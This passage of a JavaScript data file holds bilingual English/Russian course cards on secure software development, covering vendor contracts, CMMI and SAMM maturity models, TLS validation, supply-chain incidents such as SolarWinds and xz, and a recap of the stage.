      ru: `<p>Покупая ПО, вы наследуете его дефекты. Код вы проверить не можете, поэтому проверяете поставщика и записываете в договор:</p><ul><li>доказательства безопасного процесса разработки: независимые тесты, сертификаты, отчёт SOC 2;</li><li><b>SBOM</b> и обязательство закрывать известные уязвимости в оговорённые сроки;</li><li>как и как быстро вам сообщат об уязвимостях и утечках;</li><li>право на аудит или на получение его результатов;</li><li><b>депонирование исходного кода (escrow)</b>: копия у нейтральной третьей стороны, которую вы получите, если поставщик обанкротится или прекратит поддержку;</li><li>дату окончания поддержки.</li></ul>`,
    },
    take: { en: `You can't review the code, so contract for evidence, SBOM, patch times, audit rights and escrow.`, ru: `Код не проверить, поэтому в договоре — доказательства, SBOM, сроки патчей, право аудита и escrow.` } },

  { id: 's11-061', kind: 'back', back: 's03-030', k: ['d2-c7', 'd8-c7'], lvl: 2,
    title: { en: `End of support again: for software you depend on`, ru: `Снова конец поддержки: для ПО, от которого вы зависите` },
    body: {
      en: `<p>In stage 3, end of life meant the vendor stops selling; end of support meant it stops fixing. Windows XP in 2017 showed the cost.</p><p>Software components have support dates too, and they're easier to miss: a framework version, a language runtime, a database engine, an open-source library whose maintainer moved on. When Log4j 1.x reached end of life in 2015, it simply stopped getting fixes; it was still in production years later.</p><p>Track support dates in the same inventory as the SBOM, budget upgrades before the date, and treat "still runs fine" as what it is: a risk someone needs to accept in writing.</p>`,
      ru: `<p>На этапе 3 конец жизни значил, что поставщик прекращает продажи, а конец поддержки — что он прекращает исправления. Windows XP в 2017 году показала цену.</p><p>У программных компонентов тоже есть даты поддержки, и их легче пропустить: версия фреймворка, среда выполнения языка, движок базы, открытая библиотека, чей сопровождающий ушёл. Когда Log4j 1.x достиг конца жизни в 2015 году, он просто перестал получать исправления, но годами оставался в продуктиве.</p><p>Отслеживайте даты поддержки в той же описи, что и SBOM, закладывайте бюджет на обновление до даты и называйте «пока работает» тем, что это есть: риском, который кто-то должен принять письменно.</p>`,
    },
    take: { en: `Frameworks, runtimes and libraries reach end of support too; track dates with the SBOM.`, ru: `Фреймворки, среды выполнения и библиотеки тоже теряют поддержку; ведите даты вместе с SBOM.` } },

  { id: 's11-062', kind: 'vs', k: ['d8-c3'], lvl: 2,
    title: { en: `CMMI: five levels of maturity`, ru: `CMMI: пять уровней зрелости` },
    body: {
      en: `<p>The <b>Capability Maturity Model Integration (CMMI)</b> grew out of the Software CMM from Carnegie Mellon. It rates how predictable an organization's processes are, not how good one product is.</p><ol><li><b>Initial</b>: ad hoc; success depends on heroes.</li><li><b>Managed</b>: projects are planned and tracked; basic processes repeat (the old SW-CMM called this <i>Repeatable</i>).</li><li><b>Defined</b>: processes are standard across the organization.</li><li><b>Quantitatively managed</b>: processes are measured and controlled with data.</li><li><b>Optimizing</b>: continuous improvement based on those measurements.</li></ol>`,
      ru: `<p><b>Интегрированная модель зрелости возможностей (CMMI)</b> выросла из Software CMM университета Карнеги — Меллона. Она оценивает, насколько предсказуемы процессы организации, а не насколько хорош один продукт.</p><ol><li><b>Начальный</b>: всё стихийно; успех зависит от героев.</li><li><b>Управляемый</b>: проекты планируют и отслеживают; базовые процессы повторяются (в старой SW-CMM — <i>Повторяемый</i>).</li><li><b>Определённый</b>: процессы стандартны по всей организации.</li><li><b>Количественно управляемый</b>: процессы измеряются и управляются по данным.</li><li><b>Оптимизирующий</b>: постоянное улучшение на основе этих измерений.</li></ol>`,
    },
    take: { en: `Initial, managed, defined, quantitatively managed, optimizing: from heroes to measured improvement.`, ru: `Начальный, управляемый, определённый, количественно управляемый, оптимизирующий: от героев к измеряемому улучшению.` } },

  { id: 's11-063', kind: 'vs', k: ['d8-c3'], lvl: 2,
    title: { en: `SAMM vs BSIMM`, ru: `SAMM и BSIMM` },
    body: {
      en: `<ul><li><b>OWASP SAMM</b> (Software Assurance Maturity Model): <b>prescriptive</b> and open. It says what to do: five business functions (governance, design, implementation, verification, operations), each with practices rated at three maturity levels. You assess yourself, then pick target levels that fit your risk.</li><li><b>BSIMM</b> (Building Security In Maturity Model): <b>descriptive</b>. It reports what real organizations actually do, from observing many firms, so you can compare yourself with your peers.</li></ul><p>Rule: SAMM is a roadmap ("here's what good looks like"); BSIMM is a survey ("here's what others do").</p>`,
      ru: `<ul><li><b>OWASP SAMM</b> (модель зрелости обеспечения безопасности ПО): <b>предписывающая</b> и открытая. Говорит, что делать: пять бизнес-функций (управление, проектирование, реализация, проверка, эксплуатация), в каждой практики с тремя уровнями зрелости. Вы оцениваете себя и выбираете целевые уровни по своему риску.</li><li><b>BSIMM</b> (Building Security In Maturity Model): <b>описательная</b>. Сообщает, что реальные организации делают на самом деле, по наблюдениям за многими компаниями, чтобы вы могли сравнить себя с похожими.</li></ul><p>Правило: SAMM — дорожная карта («вот как выглядит хорошо»), BSIMM — обзор («вот что делают другие»).</p>`,
    },
    take: { en: `SAMM prescribes what to do; BSIMM describes what others do.`, ru: `SAMM предписывает, что делать; BSIMM описывает, что делают другие.` } },

  { id: 's11-064', kind: 'think', k: ['d8-c3', 'd1-c2'], lvl: 2,
    title: { en: `"Get us to level 5 by next year"`, ru: `«К следующему году — на уровень 5»` },
    body: {
      en: `<p>After a bad audit, the CIO announces: "Our software process is at CMMI level 1. I want level 5 within a year." A consultant offers a programme to do it.</p><p>What's your advice?</p>`,
      ru: `<p>После плохого аудита ИТ-директор объявляет: «Наш процесс разработки на уровне CMMI 1. Хочу уровень 5 через год». Консультант предлагает программу, чтобы это сделать.</p><p>Что вы посоветуете?</p>`,
    },
    reveal: {
      en: `<p>Levels can't be skipped: each one is built on the habits of the one before. You can't measure processes with data (4) or optimize them (5) until they're defined and standard (3), and you can't standardize what isn't yet repeated (2).</p><p>Aim for level 2 first: plan and track projects, version control, basic reviews. Use a structured improvement cycle, such as the <b>IDEAL</b> model (initiating, diagnosing, establishing, acting, learning). And tie the target to the business: level 5 everywhere is rarely worth the cost; the right level is the one that fits the risk.</p>`,
      ru: `<p>Уровни нельзя перепрыгнуть: каждый держится на привычках предыдущего. Нельзя управлять процессами по данным (4) или оптимизировать их (5), пока они не определены и не стандартны (3), и нельзя стандартизировать то, что ещё не повторяется (2).</p><p>Сначала цельтесь в уровень 2: планирование и отслеживание проектов, контроль версий, базовые ревью. Используйте структурированный цикл улучшения, например модель <b>IDEAL</b> (инициирование, диагностика, установление, действие, обучение). И привяжите цель к бизнесу: уровень 5 везде редко окупается; правильный уровень — тот, что соответствует риску.</p>`,
    },
    take: { en: `Maturity grows one level at a time; pick the level the risk justifies.`, ru: `Зрелость растёт по одному уровню; выбирайте уровень, который оправдан риском.` } },

  { id: 's11-065', kind: 'back', back: 's07-018', k: ['d3-c2', 'd8-c6'], lvl: 3,
    title: { en: `Clark-Wilson again: written into the application`, ru: `Снова Кларк — Вилсон: записано в приложение` },
    body: {
      en: `<p>Stage 7 described Clark-Wilson: users never touch the books directly; they go through <b>well-formed transactions</b>, with separation of duties and an audit log.</p><p>A good business application is that model in code:</p><ul><li>users can't edit tables; they can only call operations such as "post invoice" or "approve payment" (the <b>transformation procedures</b>);</li><li>each operation checks its inputs and leaves the data valid (ACID helps);</li><li>the person who enters a payment can't approve it;</li><li>every operation writes who did what to an audit trail;</li><li>regular reconciliations check the data is still consistent (the <b>integrity verification procedures</b>).</li></ul>`,
      ru: `<p>На этапе 7 была модель Кларка — Вилсона: пользователи не трогают книги напрямую, а идут через <b>правильно оформленные транзакции</b>, с разделением обязанностей и журналом аудита.</p><p>Хорошее бизнес-приложение — эта модель в коде:</p><ul><li>пользователи не правят таблицы, а только вызывают операции вроде «провести счёт» или «одобрить платёж» (<b>процедуры преобразования</b>);</li><li>каждая операция проверяет ввод и оставляет данные корректными (помогает ACID);</li><li>тот, кто ввёл платёж, не может его одобрить;</li><li>каждая операция записывает в журнал аудита, кто что сделал;</li><li>регулярные сверки проверяют, что данные всё ещё согласованы (<b>процедуры проверки целостности</b>).</li></ul>`,
    },
    take: { en: `Operations instead of table access, SoD, audit trail, reconciliations: Clark-Wilson in code.`, ru: `Операции вместо доступа к таблицам, разделение обязанностей, аудит, сверки: Кларк — Вилсон в коде.` } },

  { id: 's11-066', kind: 'back', back: 's09-031', k: ['d6-c6', 'd8-c7'], lvl: 2,
    title: { en: `Disclosure again: now you're the vendor`, ru: `Снова раскрытие: теперь вы поставщик` },
    body: {
      en: `<p>In stage 9 you were the one reporting a flaw, and coordinated disclosure gave the vendor time to fix it first.</p><p>If you ship software, you'll be on the other side. Be ready for it:</p><ul><li>a published way to report: a <b>security.txt</b> file or a vulnerability disclosure policy that promises researchers you won't sue them for acting in good faith;</li><li>a team that triages reports (often called a <b>PSIRT</b>);</li><li>optionally, a <b>bug bounty</b> that pays for valid findings;</li><li>fixes, advisories and CVE numbers published, so customers know what to patch.</li></ul><p>Companies that threaten researchers usually get full disclosure instead.</p>`,
      ru: `<p>На этапе 9 вы сообщали о дефекте, и координированное раскрытие давало поставщику время сначала исправить.</p><p>Если вы выпускаете ПО, вы окажетесь по другую сторону. Готовьтесь:</p><ul><li>опубликованный способ сообщить: файл <b>security.txt</b> или политика раскрытия уязвимостей, обещающая исследователям не преследовать их за добросовестные действия;</li><li>команда, разбирающая сообщения (часто называется <b>PSIRT</b>);</li><li>по желанию — <b>bug bounty</b>, оплачивающая подтверждённые находки;</li><li>публикация исправлений, бюллетеней и номеров CVE, чтобы клиенты знали, что обновлять.</li></ul><p>Компании, угрожающие исследователям, обычно получают полное раскрытие вместо координированного.</p>`,
    },
    take: { en: `As a vendor: publish how to report, triage with a PSIRT, consider a bounty, publish fixes.`, ru: `Как поставщик: опубликуйте, как сообщать, разбирайте через PSIRT, подумайте о bounty, публикуйте исправления.` } },

  { id: 's11-067', kind: 'idea', k: ['d8-c4', 'd3-c5'], lvl: 2,
    title: { en: `Infrastructure as code: misconfigurations caught before they exist`, ru: `Инфраструктура как код: ошибки настройки ловят до их появления` },
    body: {
      en: `<p>In the cloud, servers, networks and permissions are created from text files: <b>infrastructure as code (IaC)</b>. That brings infrastructure into the software process: version control, review, and automated scanning.</p><p>A scanner in the pipeline can reject a storage bucket that's public, a database without encryption, or a firewall rule open to the whole internet, before any of it exists. That's <b>software-defined security</b>: the controls are code, so they can be tested and repeated exactly.</p><p>The catch: someone can still change things by hand in the console. Detect that <b>drift</b>, and fix it by changing the code, not the console.</p>`,
      ru: `<p>В облаке серверы, сети и права создаются из текстовых файлов: <b>инфраструктура как код (IaC)</b>. Это вводит инфраструктуру в процесс разработки: контроль версий, ревью и автоматическое сканирование.</p><p>Сканер в конвейере может отклонить публичное хранилище, базу без шифрования или правило межсетевого экрана, открытое всему интернету, до того как что-то из этого появится. Это <b>программно-определяемая безопасность</b>: меры — это код, их можно тестировать и повторять в точности.</p><p>Подвох: кто-то всё ещё может поменять что-то вручную в консоли. Выявляйте этот <b>дрейф</b> и исправляйте его через код, а не через консоль.</p>`,
    },
    take: { en: `IaC lets you review and scan infrastructure before it exists; watch for manual drift.`, ru: `IaC позволяет проверять и сканировать инфраструктуру до её появления; следите за ручным дрейфом.` } },

  { id: 's11-068', kind: 'back', back: 's05-038', k: ['d4-c5', 'd3-c9', 'd8-c5'], lvl: 2,
    title: { en: `The padlock again: when the code ignores it`, ru: `Снова замок: когда код его игнорирует` },
    body: {
      en: `<p>Stage 5 said the padlock means the connection is encrypted to a server that proved its name with a certificate.</p><p>That proof only works if the client <b>checks</b> the certificate. A common shortcut, especially in mobile apps and internal tools, turns checking off "because the test server has a self-signed certificate", and the line ships to production. The traffic is still encrypted, but to anyone in the middle who presents any certificate at all.</p><p>Rules for developers: never disable certificate validation; use the platform's TLS libraries and defaults; for service-to-service calls, use mutual TLS with certificates from your own internal CA.</p>`,
      ru: `<p>Этап 5 говорил: замок значит, что соединение зашифровано до сервера, доказавшего своё имя сертификатом.</p><p>Это доказательство работает, только если клиент <b>проверяет</b> сертификат. Частый короткий путь, особенно в мобильных приложениях и внутренних инструментах, — отключить проверку, «потому что у тестового сервера самоподписанный сертификат», и эта строка уходит в продуктив. Трафик всё ещё шифруется, но до любого посредника с каким угодно сертификатом.</p><p>Правила для разработчиков: никогда не отключать проверку сертификатов; использовать TLS-библиотеки и настройки платформы; для вызовов между сервисами — взаимный TLS с сертификатами от собственного внутреннего УЦ.</p>`,
    },
    take: { en: `TLS without certificate validation is encryption to anyone; never turn the check off.`, ru: `TLS без проверки сертификата — шифрование до кого угодно; не отключайте проверку.` } },

  { id: 's11-069', kind: 'idea', k: ['d8-c5', 'd8-c4'], lvl: 2,
    title: { en: `Code written by an assistant`, ru: `Код, написанный ассистентом` },
    body: {
      en: `<p>Developers now write much of their code with AI assistants. That speeds work up, and it changes nothing about who is responsible: generated code goes through the same review, tests and scans as code a person typed.</p><p>A few risks are specific:</p><ul><li>assistants repeat insecure patterns common in the code they learned from;</li><li>they sometimes suggest <b>packages that don't exist</b>; researchers have shown attackers can register those names and wait;</li><li>developers may paste secrets or confidential code into a tool outside the company.</li></ul><p>So: approved tools only, no secrets in prompts, and the pipeline's checks apply to everything.</p>`,
      ru: `<p>Разработчики теперь пишут много кода с ИИ-ассистентами. Это ускоряет работу и ничего не меняет в ответственности: сгенерированный код проходит те же ревью, тесты и сканирование, что и набранный человеком.</p><p>Есть особые риски:</p><ul><li>ассистенты повторяют небезопасные шаблоны, распространённые в коде, на котором учились;</li><li>иногда они предлагают <b>несуществующие пакеты</b>; исследователи показали, что злоумышленники могут зарегистрировать эти имена и ждать;</li><li>разработчики могут вставить секреты или конфиденциальный код в инструмент вне компании.</li></ul><p>Поэтому: только одобренные инструменты, никаких секретов в запросах, и проверки конвейера действуют для всего.</p>`,
    },
    take: { en: `Generated code gets the same review and scans; watch for invented packages and leaked secrets.`, ru: `Сгенерированный код проходит те же ревью и сканирование; следите за выдуманными пакетами и утечкой секретов.` } },

  { id: 's11-070', kind: 'back', back: 's10-010', k: ['d8-c8', 'd1-c13'], lvl: 3,
    title: { en: `NotPetya, SolarWinds, xz: three poisoned supply chains`, ru: `NotPetya, SolarWinds, xz: три отравленные цепочки` },
    body: {
      en: `<p>In stage 10, NotPetya spread through a hijacked update of M.E.Doc, a small Ukrainian accounting program. Put it next to this stage's stories:</p><ul><li><b>NotPetya</b>: the vendor's update server was compromised; the payload was loud and destructive.</li><li><b>SolarWinds</b>: the vendor's build process was compromised; the backdoor was quiet, signed, and selective.</li><li><b>xz</b>: the open-source project itself was compromised, through a trusted maintainer; caught by chance.</li></ul><p>Three different weak points, one lesson: software you install is code from people you trust. Limit what it can reach, and watch what it does.</p>`,
      ru: `<p>На этапе 10 NotPetya распространялся через захваченное обновление M.E.Doc, небольшой украинской бухгалтерской программы. Поставьте его рядом с историями этого этапа:</p><ul><li><b>NotPetya</b>: взломан сервер обновлений поставщика; нагрузка была громкой и разрушительной.</li><li><b>SolarWinds</b>: взломан процесс сборки поставщика; бэкдор был тихим, подписанным и избирательным.</li><li><b>xz</b>: взломан сам открытый проект, через доверенного сопровождающего; поймали случайно.</li></ul><p>Три разных слабых места, один урок: устанавливаемое ПО — это код людей, которым вы доверяете. Ограничивайте, до чего оно может дотянуться, и следите, что оно делает.</p>`,
    },
    take: { en: `Update server, build system, maintainer: three supply-chain entry points; limit and watch what you install.`, ru: `Сервер обновлений, сборка, сопровождающий: три входа в цепочку; ограничивайте и наблюдайте установленное.` } },

  { id: 's11-071', kind: 'link', k: ['d8-c4', 'd1-c13', 'd8-c1', 'd6-c4', 'd3-c7', 'd7-c2'], lvl: 3,
    title: { en: `SolarWinds replayed with this stage`, ru: `SolarWinds заново, с этим этапом` },
    body: {
      en: `<p>Replay 2020, from both sides.</p><p><b>As the vendor:</b></p><ol><li>The build server is treated as a crown jewel: isolated, short-lived build machines, MFA, monitored.</li><li><b>Provenance</b> ties each signed release to a reviewed commit; a <b>reproducible</b> rebuild on separate infrastructure doesn't match, and the release stops.</li></ol><p><b>As the customer:</b></p><ol start="3"><li>The vendor's <b>SBOM</b> and security evidence were checked when the product was bought.</li><li>The monitoring server gets only the network access it needs; its unusual outbound DNS and HTTP traffic is <b>logged and alerted</b>.</li><li>A signed update is still treated as code from a third party, not as proof of safety.</li></ol>`,
      ru: `<p>Переиграем 2020 год с обеих сторон.</p><p><b>Как поставщик:</b></p><ol><li>Сборочный сервер — главная ценность: изолированные короткоживущие сборщики, MFA, мониторинг.</li><li><b>Происхождение</b> связывает каждый подписанный выпуск с проверенным коммитом; <b>воспроизводимая</b> пересборка на отдельной инфраструктуре не совпадает, и выпуск останавливается.</li></ol><p><b>Как клиент:</b></p><ol start="3"><li><b>SBOM</b> поставщика и доказательства безопасности проверили при покупке.</li><li>Сервер мониторинга получает только нужный ему сетевой доступ; его необычный исходящий трафик DNS и HTTP <b>журналируется и вызывает оповещение</b>.</li><li>Подписанное обновление всё равно считается кодом третьей стороны, а не доказательством безопасности.</li></ol>`,
    },
    take: { en: `Vendor: guard the build and prove provenance. Customer: vet, limit, monitor, even signed code.`, ru: `Поставщик: охранять сборку и доказывать происхождение. Клиент: проверять, ограничивать, наблюдать даже подписанный код.` } },

  { id: 's11-072', kind: 'think', k: ['d8-c1', 'd1-c9', 'd6-c6'], lvl: 3,
    title: { en: `A critical finding the day before release`, ru: `Критичная находка накануне релиза` },
    body: {
      en: `<p>The day before a major release that marketing has promoted for weeks, the final scan finds a high-severity flaw: an authenticated user could view other users' invoices by changing a number in the URL. A fix will take three days. The product manager wants to release on time and patch next week.</p><p>Who decides, and what should they consider?</p>`,
      ru: `<p>Накануне крупного релиза, который маркетинг продвигал неделями, финальное сканирование находит серьёзный дефект: вошедший пользователь может видеть чужие счета, меняя число в URL. Исправление займёт три дня. Продакт-менеджер хочет выпуститься в срок и поправить на следующей неделе.</p><p>Кто решает и что нужно учесть?</p>`,
    },
    reveal: {
      en: `<p>The <b>business owner</b> of the product decides, not security and not the product manager alone. Security's job is to make the risk clear: this is broken access control on personal and financial data, it's easy to find and exploit, and a breach would mean regulatory notification and customer harm.</p><p>Offer options, not just "no": delay three days; release with the invoice feature switched off; or add a quick server-side ownership check as a stopgap. If the owner still accepts the risk, record it in writing with an expiry date. In practice, once the risk is stated this plainly, few owners sign it.</p>`,
      ru: `<p>Решает <b>владелец</b> продукта со стороны бизнеса, а не безопасность и не продакт-менеджер в одиночку. Задача безопасности — сделать риск понятным: это нарушенный контроль доступа к персональным и финансовым данным, его легко найти и использовать, а утечка означает уведомление регулятора и вред клиентам.</p><p>Предложите варианты, а не только «нет»: отложить на три дня; выпустить с отключённой функцией счетов; или временно добавить быструю серверную проверку владельца. Если владелец всё равно принимает риск, запишите это письменно со сроком действия. На практике, когда риск сформулирован так прямо, подписывают его немногие.</p>`,
    },
    take: { en: `The owner decides; security frames the risk and offers options; acceptance is written and time-limited.`, ru: `Решает владелец; безопасность формулирует риск и предлагает варианты; принятие — письменно и на срок.` } },

  { id: 's11-073', kind: 'recap', lvl: 1,
    title: { en: `Stage 11 in seven lines`, ru: `Этап 11 в семи строках` },
    body: {
      en: `<p>Tap any line to go back to its card.</p>`,
      ru: `<p>Нажмите на строку, чтобы вернуться к карточке.</p>`,
    },
    items: [
      ['s11-002', { en: `Shift left: security requirements and threat models before code.`, ru: `Сдвиг влево: требования безопасности и модель угроз до кода.` }],
      ['s11-013', { en: `DevSecOps: automated gates on every change, only signed builds reach production.`, ru: `DevSecOps: автоматические ворота на каждое изменение, в продуктив — только подписанные сборки.` }],
      ['s11-022', { en: `A code signature proves who and intact, not safe: protect the build itself.`, ru: `Подпись кода доказывает «кто» и «цело», а не «безопасно»: защищайте саму сборку.` }],
      ['s11-024', { en: `SAST reads code, DAST attacks the running app, SCA lists the components.`, ru: `SAST читает код, DAST атакует работающее приложение, SCA перечисляет компоненты.` }],
      ['s11-028', { en: `Most risky components are transitive: the SBOM is how you find them.`, ru: `Большинство рискованных компонентов транзитивны: найти их помогает SBOM.` }],
      ['s11-037', { en: `Never trust input: parameterized queries, output encoding, server-side checks.`, ru: `Не доверяй вводу: параметризованные запросы, кодирование вывода, проверки на сервере.` }],
      ['s11-060', { en: `Bought or open source, you own the risk: vet, contract, track support dates.`, ru: `Купленное или открытое — риск ваш: проверка, договор, даты поддержки.` }],
    ],
    take: { en: `Next: staying in business, continuity and recovery.`, ru: `Дальше: как устоять — непрерывность и восстановление.` } },
] });
